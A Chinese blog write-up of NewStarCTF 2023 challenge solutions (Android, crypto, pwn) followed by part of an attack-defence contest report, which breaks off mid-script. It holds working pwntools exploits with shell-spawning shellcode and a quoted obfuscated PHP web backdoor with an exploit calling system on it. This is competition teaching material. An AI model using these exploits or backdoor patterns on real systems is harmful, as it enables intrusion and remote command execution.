annotation.annotation system Ldalvik/annotation/InnerClass; accessFlags = 0x0 name = null.end annotation# instance fields.field final synthetic this$0:Lcom/droidlearn/activity_travel/FlagActivity;.field final synthetic val$str:Landroid/widget/EditText;.field final synthetic val$tv_cnt:Landroid/widget/TextView;# direct methods.method constructor &lt;init&gt;(Lcom/droidlearn/activity_travel/FlagActivity;Landroid/widget/TextView;Landroid/widget/EditText;)V .locals 0 .line 20 iput-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;this$0:Lcom/droidlearn/activity_travel/FlagActivity; iput-object p2, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;val$tv_cnt:Landroid/widget/TextView; iput-object p3, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;val$str:Landroid/widget/EditText; invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V return-void.end method# virtual methods.method public onClick(Landroid/view/View;)V .locals 2 .line 23 iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;val$tv_cnt:Landroid/widget/TextView; iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;this$0:Lcom/droidlearn/activity_travel/FlagActivity; invoke-static &#123;v0&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$004(Lcom/droidlearn/activity_travel/FlagActivity;)I move-result v0 invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String; move-result-object v0 invoke-virtual &#123;p1, v0&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V .line 24 iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;this$0:Lcom/droidlearn/activity_travel/FlagActivity; invoke-static &#123;p1&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$000(Lcom/droidlearn/activity_travel/FlagActivity;)I move-result p1 const/16 v0, 0x2710 if-lt p1, v0, :cond_0 .line 25 iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;this$0:Lcom/droidlearn/activity_travel/FlagActivity; iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;val$str:Landroid/widget/EditText; invoke-virtual &#123;v0&#125;, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable; move-result-object v0 invoke-virtual &#123;v0&#125;, Ljava/lang/Object;-&gt;toString()Ljava/lang/String; move-result-object v0 const/4 v1, 0x0 invoke-static &#123;p1, v0, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast; move-result-object p1 invoke-virtual &#123;p1&#125;, Landroid/widget/Toast;-&gt;show()V :cond_0 return-void.end method 发现其中的const/16 v0, 0x2710，其存储为点击次数，将其改为0x1，重新编译安装，打开后点击按钮直接得到flag flag&#123;Act1v1ty_!s_so00oo0o_lmpor#an#&#125; Crypto解题 10&#x2F;10 brainfuck下载附件，得到 1++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++.&gt;----.&lt;-----.&gt;-----.&gt;-----.&lt;&lt;&lt;-.&gt;&gt;++..&lt;.&gt;.++++++.....------.&lt;.&gt;.&lt;&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;+++++++.&gt;&gt;&gt;+.&lt;&lt;&lt;-------.&gt;&gt;&gt;-.&lt;&lt;&lt;+.+++++++.--..&gt;&gt;&gt;&gt;---.-.&lt;&lt;&lt;&lt;-.+++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-------.+.&gt;&gt;&gt;&gt;&gt;++. Brainfuck&#x2F;OoK加密解密 - Bugku CTF，解密一下，得到flag：flag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125; Caesar’s Secert打开附件，得到kqfl&#123;hf3x4w&#39;x_h1umjw_n5_a4wd_3fed&#125; 凯撒枚举凯撒(Caesar)加密&#x2F;解密 - Bugku CTF，得到flag：flag&#123;ca3s4r&#39;s_c1pher_i5_v4ry_3azy&#125; Fence附件内容：fa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3 栅栏加密栅栏加密&#x2F;解密 - Bugku CTF，枚举解密，得到flag：flag&#123;reordering_the_plaintext#686f8c03&#125; Vigenère附件：pqcq&#123;qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0&#125; 维吉尼亚解密维吉尼亚加密&#x2F;解密 - Bugku CTF，密钥用flag前4个字母尝试一下得到：KFC 得到flag：flag&#123;la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0&#125; babyrsa打开附件 123456789101112131415161718192021from Crypto.Util.number import *from flag import flagdef gen_prime(n): res = 1 for i in range(15): res *= getPrime(n) return resif __name__ == &#x27;__main__&#x27;: n = gen_prime(32) e = 65537 m = bytes_to_long(flag) c = pow(m,e,n) print(n) print(c)# 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261# 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595 使用大整数分解网站factordb.com，将其分解为多个质数之积 11729006607...61&lt;143&gt; = 2217990919&lt;10&gt; · 2338725373&lt;10&gt; · 2370292207&lt;10&gt; · 2463878387&lt;10&gt; · 2706073949&lt;10&gt; · 2794985117&lt;10&gt; · 2804303069&lt;10&gt; · 2923072267&lt;10&gt; · 2970591037&lt;10&gt; · 3207148519&lt;10&gt; · 3654864131&lt;10&gt; · 3831680819&lt;10&gt; · 3939901243&lt;10&gt; · 4093178561&lt;10&gt; · 4278428893&lt;10&gt; 解密 1234567891011121314151617181920212223from Crypto.Util.number import inversen = 2217990919 * 2338725373 * 2370292207 * 2463878387 * 2706073949 * 2794985117 * 2804303069 * 2923072267 * 2970591037 * 3207148519 * 3654864131 * 3831680819 * 3939901243 * 4093178561 * 4278428893e = 65537c = 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595# 尝试分解 nfactors = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]# 计算 phi(n)phi_n = 1for factor in factors: phi_n *= (factor - 1)# 计算私钥 dd = inverse(e, phi_n)# 解密密文得到明文m = pow(c, d, n)# 将明文转换为字节形式flag = m.to_bytes((m.bit_length() + 7) // 8, &#x27;big&#x27;)print(flag) Small d打开附件py代码： 1234567891011121314151617181920from secret import flagfrom Crypto.Util.number import *p = getPrime(1024)q = getPrime(1024)d = getPrime(32)e = inverse(d, (p-1)*(q-1))n = p*qm = bytes_to_long(flag)c = pow(m,e,n)print(c)print(e)print(n)# c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248# e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825# n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433 看到d数值比较小，使用低解密指数攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150import gmpy2from Crypto.PublicKey import RSAfrom Crypto.Util.number import long_to_bytesdef rational_to_contfrac(x,y): &#x27;&#x27;&#x27; Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] &#x27;&#x27;&#x27; a = x//y pquotients = [a] while a * y != x: x,y = y,x-a*y a = x//y pquotients.append(a) return pquotientsdef convergents_from_contfrac(frac): &#x27;&#x27;&#x27; computes the list of convergents using the list of partial quotients &#x27;&#x27;&#x27; convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0:i])) return convsdef contfrac_to_rational (frac): &#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an] to an x/y rational. &#x27;&#x27;&#x27; if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2,-len(frac)-1,-1): num, denom = frac[_]*num+denom, num return (num,denom)def egcd(a,b): &#x27;&#x27;&#x27; Extended Euclidean Algorithm returns x, y, gcd(a,b) such that ax + by = gcd(a,b) &#x27;&#x27;&#x27; u, u1 = 1, 0 v, v1 = 0, 1 while b: q = a // b u, u1 = u1, u - q * u1 v, v1 = v1, v - q * v1 a, b = b, a - q * b return u, v, adef gcd(a,b): &#x27;&#x27;&#x27; 2.8 times faster than egcd(a,b)[2] &#x27;&#x27;&#x27; a,b=(b,a) if a&lt;b else (a,b) while b: a,b=b,a%b return adef modInverse(e,n): &#x27;&#x27;&#x27; d such that de = 1 (mod n) e must be coprime to n this is assumed to be true &#x27;&#x27;&#x27; return egcd(e,n)[0]%ndef totient(p,q): &#x27;&#x27;&#x27; Calculates the totient of pq &#x27;&#x27;&#x27; return (p-1)*(q-1)def bitlength(x): &#x27;&#x27;&#x27; Calculates the bitlength of x &#x27;&#x27;&#x27; assert x &gt;= 0 n = 0 while x &gt; 0: n = n+1 x = x&gt;&gt;1 return ndef isqrt(n): &#x27;&#x27;&#x27; Calculates the integer square root for arbitrary large nonnegative integers &#x27;&#x27;&#x27; if n &lt; 0: raise ValueError(&#x27;square root not defined for negative numbers&#x27;) if n == 0: return 0 a, b = divmod(bitlength(n), 2) x = 2**(a+b) while True: y = (x + n//x)//2 if y &gt;= x: return x x = ydef is_perfect_square(n): &#x27;&#x27;&#x27; If n is a perfect square it returns sqrt(n), otherwise returns -1 &#x27;&#x27;&#x27; h = n &amp; 0xF; #last hexadecimal &quot;digit&quot; if h &gt; 9: return -1 # return immediately in 6 cases out of 16. # Take advantage of Boolean short-circuit evaluation if ( h != 2 and h != 3 and h != 5 and h != 6 and h != 7 and h != 8 ): # take square root if you must t = isqrt(n) if t*t == n: return t else: return -1 return -1def wiener_hack(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr &gt;= 0): t = is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print(&quot;Hacked!&quot;) return d return Falsedef main(): n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433 e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825 c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248 d = wiener_hack(e, n) m = pow(c,d,n) print (long_to_bytes(m))if __name__==&quot;__main__&quot;: main() 拿到flag：flag&#123;learn_some_continued_fraction_technique#dc16885c&#125; babyxor打开附件，得到一段python： 123456789from secret import *ciphertext = []for f in flag: ciphertext.append(f ^ key)print(bytes(ciphertext).hex())# e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2 由于已知flag是flag&#123;开头的，所以我们可以得到key的值，编写解密脚本： 123456789101112131415ciphertext_hex = &#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;# 将16进制字符串转换为字节列表ciphertext_bytes = bytes.fromhex(ciphertext_hex)# 解密密文plaintext = []for c in ciphertext_bytes: print(chr(ord(chr(c))^143),end=&#x27;&#x27;) #plaintext.append(c ^ key)# 将字节列表转换为字符串plaintext_str = &#x27;&#x27;.join([chr(p) for p in plaintext])print(plaintext_str) 得到flag：flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125; babyencoding使用cyberchef，第一段得到flag&#123;dazzling_encoding#4e0ad4，第二段得到：f0ca08d1e1d0f10c0c7afe422fea7，第三段使用UUencode解密UUencode加密&#x2F;解密 - Bugku CTF，得到c55192c992036ef623372601ff3a&#125;。 拼接一下，得到flag：flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125; Affine附件一段python 12345678910from flag import flag, keyciphertext = []for f in flag: ciphertext.append((key[0]*f + key[1]) % 256)print(bytes(ciphertext).hex())# dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064 因为flag前4个字母是flag，因此可以列出4个方程 1234221+256*a=key0*102+key167+256*b=key0*108+key1136+256*c=key0*97+key1238+256*d=key0*103+key1 得到 12key0 = (52 + 256 * (a - b + c - d)) / -12key1 = 221 + 256 * a - key0 * 102 测试猜测key0&#x3D;17，key1&#x3D;23 解密 1234567891011121314151617181920212223242526# 密文和密钥ciphertext_hex = &quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;key = (17, 23) # 请将a和b替换为实际的密钥值# 计算key[0]的模数逆def mod_inverse(a, m): m0, x0, x1 = m, 0, 1 while a &gt; 1: q = a // m m, a = a % m, m x0, x1 = x1 - q * x0, x0 return x1 + m0 if x1 &lt; 0 else x1# 将密文转换为字节列表ciphertext_bytes = bytes.fromhex(ciphertext_hex)flag = []# 逆向解密for c in ciphertext_bytes: original_byte = ((c - key[1]) * mod_inverse(key[0], 256)) % 256 flag.append(original_byte)# 将解密后的字节列表转换为字符串original_flag = bytes(flag).decode(&#x27;utf-8&#x27;)print(original_flag) 得到flag：flag&#123;4ff1ne_c1pher_i5_very_3azy&#125; babyaes打开附件 123456789101112131415161718192021222324from Crypto.Cipher import AESimport osfrom flag import flagfrom Crypto.Util.number import *def pad(data): return data + b&quot;&quot;.join([b&#x27;\\x00&#x27; for _ in range(0, 16 - len(data))])def main(): flag_ = pad(flag) key = os.urandom(16) * 2 iv = os.urandom(16) print(bytes_to_long(key) ^ bytes_to_long(iv) ^ 1) aes = AES.new(key, AES.MODE_CBC, iv) enc_flag = aes.encrypt(flag_) print(enc_flag)if __name__ == &quot;__main__&quot;: main()# 3657491768215750635844958060963805125333761387746954618540958489914964573229# b&#x27;&gt;]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i&#x27; key是32bytes,256bits ；iv是16bytes ,128bits key^iv ，那么只有 iv 与 key的低128位相异或，所以key的高128位是固定不变的。所以输出结果的高128bits,就是key的高128bits,进而可以得到key的所有值256bits。 之后key的低128bits，与输出结果的低128bits相异或，所得结果就是iv的值了 解密： 1234567891011121314151617from Crypto.Cipher import AESimport osfrom gmpy2 import*from Crypto.Util.number import*xor = 3657491768215750635844958060963805125333761387746954618540958489914964573229^1enc_flag = b&#x27;&gt;]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i&#x27;out = long_to_bytes(xor)key = out[:16]*2# print(key)iv = bytes_to_long(key[16:])^bytes_to_long(out[16:])# print(iv)iv = long_to_bytes(iv)# print(iv)aes = AES.new(key,AES.MODE_CBC,iv)flag = aes.decrypt(enc_flag)print(flag) 得到b&#39;firsT_cry_Aes\\x00\\x00\\x00&#39; flag：flag&#123;firsT_cry_Aes&#125; Pwn3&#x2F;5 ret2text栈溢出 ida打开发现明显的栈溢出，而且还有后门backdoor()函数 反汇编代码 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); puts(&quot;Welcome to NewStar CTF!!&quot;); puts(&quot;Show me your magic&quot;); read(0, buf, 0x100uLL); return 0;&#125; backdoor代码 12345int backdoor()&#123; puts(&quot;Congratulations!!!&quot;); return execve(&quot;/bin/sh&quot;, 0LL, 0LL);&#125; backdoor地址00000000004011FB 编写脚本 1234567891011121314151617from pwn import *return_address = 0x4011FBpadding = b&#x27;A&#x27; * 40# 构造payloadpayload = padding + p64(return_address)# 连接目标服务r = remote(&#x27;node4.buuoj.cn&#x27;,27081)r.recvline()r.recvline()# 发送payloadr.sendline(payload)# 接收响应r.interactive() 之后直接cat flag即可拿到flag：flag&#123;11b564d9-fb42-41c6-a215-a750c4fc8c28&#125; ezshellcode反汇编 1234567891011int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; void *buf; // [rsp+8h] [rbp-8h] init(argc, argv, envp); buf = (void *)(int)mmap((void *)0x66660000, 0x1000uLL, 7, 50, -1, 0LL); puts(&quot;Welcome to NewStar CTF!!&quot;); puts(&quot;Show me your magic&quot;); read(0, buf, 0x100uLL); JUMPOUT(0x66660000LL);&#125; 直接写shellcode即可，网上随便搜一个shellcode，编写脚本 123456789101112131415161718from pwn import *# shellcodeshellcode = b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27;# 启动进程r = remote(&#x27;node4.buuoj.cn&#x27;,28681)# 读取欢迎信息print(r.recv())# 写入shellcode到内存块r.sendline(shellcode)r.interactive()# 关闭进程r.close() 直接cat flag newstar shop主函数 123456789101112131415161718192021222324252627282930int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+8h] [rbp-8h] v4 = __readfsqword(0x28u); init(argc, argv, envp); while ( 1 ) &#123; menu(); if ( (int)__isoc99_scanf(&quot;%d&quot;, &amp;v3) &lt;= 0 ) puts(&quot;Invalid input&quot;); switch ( v3 ) &#123; case 1: shop(); break; case 2: makemoney(); break; case 3: dont_try(); break; default: puts(&quot;nothing here&quot;); puts(&quot;\\n&quot;); break; &#125; &#125;&#125; menu() 12345678910111213unsigned __int64 menu()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); puts(&quot;=================&quot;); puts(&quot;1.Go to the shop &quot;); puts(&quot;2.Make some money&quot;); puts(&quot;3.Don&#x27;t choose &quot;); puts(&quot;=================&quot;); puts(&quot;\\n&quot;); return v1 - __readfsqword(0x28u);&#125; shop() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869unsigned __int64 shop()&#123; int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;=============================&quot;); puts(&quot;===Welcome to newstar shop===&quot;); puts(&quot;=============================&quot;); puts(&quot;1.newstar&#x27;s gift 20$&quot;); puts(&quot;2.pwn write up 40$&quot;); puts(&quot;3.shell 9999$&quot;); puts(&quot;\\n&quot;); puts(&quot;All things are only available for one day!&quot;); puts(&quot;What do you want to buy?&quot;); puts(&quot;\\n&quot;); if ( (int)__isoc99_scanf(&quot;%d&quot;, &amp;v1) &lt;= 0 ) puts(&quot;Invalid input&quot;); if ( v1 != 3 ) &#123; if ( v1 &gt; 3 ) &#123;LABEL_17: puts(&quot;nothing here&quot;); puts(&quot;\\n&quot;); return v2 - __readfsqword(0x28u); &#125; if ( v1 == 1 ) &#123; if ( (unsigned int)money &gt; 0x13 ) &#123; money -= 20; puts(&quot;You buy a newstar&#x27;s gift&quot;); puts(&quot;That is the gift:&quot;); puts(&quot;What will happen when int transfer to unsigned int?&quot;); goto LABEL_10; &#125; &#125; else &#123; if ( v1 != 2 ) goto LABEL_17; if ( (unsigned int)money &gt; 0x27 ) &#123; money -= 40; puts(&quot;You buy a pwn write up&quot;); puts(&quot;That is free after the match,haha&quot;); goto LABEL_10; &#125; &#125; puts(&quot;Sorry,you don&#x27;t have enough money&quot;);LABEL_10: puts(&quot;\\n&quot;); return v2 - __readfsqword(0x28u); &#125; if ( (unsigned int)money &gt; 0x270E ) &#123; money = 0; puts(&quot;How do you buy it?&quot;); puts(&quot;\\n&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;Sorry,you don&#x27;t have enough money&quot;); puts(&quot;\\n&quot;); &#125; return v2 - __readfsqword(0x28u);&#125; makemoney() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859unsigned __int64 makemoney()&#123; int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;============================&quot;); puts(&quot;==========Job list==========&quot;); puts(&quot;============================&quot;); puts(&quot;1.McDonald part time job 20$&quot;); puts(&quot;2.MeiTuan takeout 40$&quot;); puts(&quot;3.Giving out leaflets 60$&quot;); puts(&quot;What do you want to do?&quot;); puts(&quot;\\n&quot;); if ( (int)__isoc99_scanf(&quot;%d&quot;, &amp;v1) &lt;= 0 ) puts(&quot;Invalid input&quot;); switch ( v1 ) &#123; case 1: if ( hour &lt;= 3 ) goto LABEL_12; puts(&quot;You chose McDonald&#x27;s part time job&quot;); puts(&quot;It took you 4hours and earned 20$&quot;); puts(&quot;\\n&quot;); hour -= 4; money += 20; break; case 2: if ( hour &lt;= 7 ) &#123;LABEL_12: puts(&quot;You need to rest&quot;); puts(&quot;\\n&quot;); return v2 - __readfsqword(0x28u); &#125; puts(&quot;You chose MeiTuan takeout&quot;); puts(&quot;It took you 8hours and earned 40$&quot;); puts(&quot;\\n&quot;); hour -= 8; money += 40; break; case 3: if ( hour &gt; 11 ) &#123; puts(&quot;You chose giving out leaflets&quot;); puts(&quot;It took you 12hours and earned 60$&quot;); puts(&quot;\\n&quot;); hour -= 12; money += 60; return v2 - __readfsqword(0x28u); &#125; goto LABEL_12; default: puts(&quot;nothing here&quot;); puts(&quot;\\n&quot;); return v2 - __readfsqword(0x28u); &#125; return v2 - __readfsqword(0x28u);&#125; dont_try() 12345678910111213141516unsigned __int64 dont_try()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); if ( chance ) &#123; puts(&quot;You shouldn&#x27;t choose this&quot;); puts(&quot;Please remember, the shop owner doesn&#x27;t like his secret to be found&quot;); puts(&quot;To punish your choice, you will lose 50$ and you will never be able to choose it!&quot;); puts(&quot;\\n&quot;); money -= 50; --chance; &#125; return v1 - __readfsqword(0x28u);&#125; 原理：有符号型负数int转化为无符号int会导致无符号int数值特别大 因此，先把所有money花光，之后去dont_try()函数减钱，将其变成负数，即可买到shell 总结作为新生赛，还是比较简单的，对初学者比较友好。 贴一个官方wp：NewStarCTF 2023 Week1 官方WriteUp (shimo.im)","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"}],"tags":[{"name":"web","slug":"web","permalink":"https://blog.lazyforever.top/tags/web/"},{"name":"reverse","slug":"reverse","permalink":"https://blog.lazyforever.top/tags/reverse/"},{"name":"misc","slug":"misc","permalink":"https://blog.lazyforever.top/tags/misc/"},{"name":"pwn","slug":"pwn","permalink":"https://blog.lazyforever.top/tags/pwn/"},{"name":"crypto","slug":"crypto","permalink":"https://blog.lazyforever.top/tags/crypto/"}]},{"title":"天津市大学生信息安全网络攻防大赛","slug":"2023tianjindawd","date":"2023-09-19T05:07:18.000Z","updated":"2023-10-12T10:45:17.619Z","comments":true,"path":"2023/09/19/2023tianjindawd/","link":"","permalink":"https://blog.lazyforever.top/2023/09/19/2023tianjindawd/","excerpt":"","text":"介绍此次比赛设DAWD攻防赛和应急响应实战场景赛两个赛题类型，两种赛题同时开赛，其中： ① DAWD攻防赛会提供4个攻防题目环境，2个web题目环境，2个pwn题目环境，比赛开始时全部开放； ② 应急响应实战场景赛共一个场景，场景赛包含多个题目，根据问题的难度会设置不同的分值，选手可以通过提交不同题目获取相应的分值。 排名队伍名字 NKV DAWD攻防赛排名第一 应急响应排名第七 总分第一 过程dawd的shop题目我们审计出了两个漏洞 第一个是在&#x2F;config&#x2F;config.php 1234567891011&lt;?php@$_++;$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;&#125;&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;&#123;&quot;^&quot;/&quot;);$___=(&quot;$&quot;^&quot;&#123;&quot;).(&quot;~&quot;^&quot;.&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;-&quot;^&quot;~&quot;).(&quot;(&quot;^&quot;|&quot;);$&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);?&gt; 一个明显的后门，相当于$_GET[&#39;0&#39;]($_POST[&#39;1&#39;]) 直接system(&#39;cat /flag&#39;)就行 另一个是在&#x2F;controller&#x2F;index.class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;?phpclass indexController extends medoo&#123; function index() &#123; $date = get(&#x27;time&#x27;); switch ($date) &#123; case &#x27;today&#x27;: $datas[&#x27;time&#x27;] = &#x27;today&#x27;; break; case &#x27;yestoday&#x27;: $datas[&#x27;time&#x27;] = &#x27;yestoday&#x27;; break; case &#x27;before&#x27;: $datas[&#x27;time&#x27;] = &#x27;before&#x27;; break; default: $datas[&#x27;time&#x27;] = &#x27;today&#x27;; break; &#125; $datas[&#x27;title&#x27;] = &#x27;ASHOP&#x27;; $database = new index(); $datas[&#x27;cats&#x27;] = $database-&gt;get_cats(); $user_data = array(); $user_data[&#x27;time&#x27;] = time(); $user_data[&#x27;ip&#x27;] = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; setcookie(&quot;AshopToken&quot;, base64_encode(serialize($user_data))); $this-&gt;display( $datas ); &#125; function cat() &#123; $catid = get(&#x27;id&#x27;); $datas[&#x27;title&#x27;] = &#x27;cat | ASHOP&#x27;; $datas[&#x27;catid&#x27;] = $catid; $database = new index(); $datas[&#x27;cats&#x27;] = $database-&gt;get_cats(); $this-&gt;display( $datas ); &#125; function more() &#123; $date = get(&#x27;time&#x27;); switch ($date) &#123; case &#x27;today&#x27;: $time = date(&#x27;Y-m-d&#x27;,time()); break; case &#x27;yestoday&#x27;: $time = date(&#x27;Y-m-d&#x27;,strtotime(&#x27;-1 day&#x27;)); break; case &#x27;before&#x27;: $time = date(&#x27;Y-m-d&#x27;,strtotime(&#x27;-2 day&#x27;)); break; &#125; $database = new index(); $datas[&#x27;contents&#x27;] = $database-&gt;get_contents( $time ); $data = $datas[&#x27;contents&#x27;]; $result = $database-&gt;get_more( $data ); echo $result; &#125; function cat_more() &#123; $catid = get(&#x27;id&#x27;); $database = new index(); $datas[&#x27;contents&#x27;] = $database-&gt;cat_contents( $catid ); $data = $datas[&#x27;contents&#x27;]; //print_r($data); $result = $database-&gt;get_more( $data ); echo $result; &#125; function show_pic() &#123; $pic = get(&#x27;file&#x27;); if ($pic != null)&#123; header(&quot;Content-type:image/jpeg&quot;); echo file_get_contents($pic); &#125; &#125;&#125; 其中末尾处 12345678function show_pic() &#123; $pic = get(&#x27;file&#x27;); if ($pic != null)&#123; header(&quot;Content-type:image/jpeg&quot;); echo file_get_contents($pic); &#125; &#125; 参数file直接作为变量进行file_get_contents，没有对变量进行过滤，导致直接?c=index&amp;a=show_pic&amp;file=/flag就可以拿到flag 这里直接贴上我的exp 12345678910111213141516171819202122232425262728293031323334import reimport requestsimport sys# 正则匹配flagdef find_flag (str): pattern = r&#x27;^flag\\&#123;.*\\&#125;$&#x27; result = re.match(pattern, str).group(0) return result# 初始化try: HOST = sys.argv[1] PORT = sys.argv[2]except: passurl=f&quot;http://&#123;HOST&#125;:&#123;PORT&#125;/config/config.php?0=system&quot;uri=&quot;&quot;target=url+uridata=&#123; &#x27;1&#x27;:&#x27;cat 